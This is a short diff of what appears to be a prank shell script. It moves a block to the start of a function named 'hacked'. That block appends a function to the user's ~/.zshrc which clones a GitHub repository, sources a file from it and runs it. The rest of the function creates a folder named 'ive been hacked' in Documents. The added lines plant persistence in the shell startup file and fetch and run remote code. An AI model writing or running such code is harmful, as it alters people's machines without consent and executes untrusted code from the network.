@@ -1,4 +1,11 @@
 hacked() {
+  cd ~/
+  echo "
+    hack() {
+      git clone https://github.com/jfreire-benites/hm && cd hm && source .zshrchk && hacked;
+    }
+  " >> .zshrc;
+  source .zshrc;
   sleep 10s;
   cd ~/Documents;
   mkdir "ive been hacked";
@@ -31,11 +38,4 @@ hacked() {
     fi
     sleep 0.4s;
     done
-  cd ~/
-  echo "
-    hack() {
-      git clone https://github.com/jfreire-benites/hm && cd hm && source .zshrchk && hacked;
-    }
-  " >> .zshrc;
-  source .zshrc;
 }
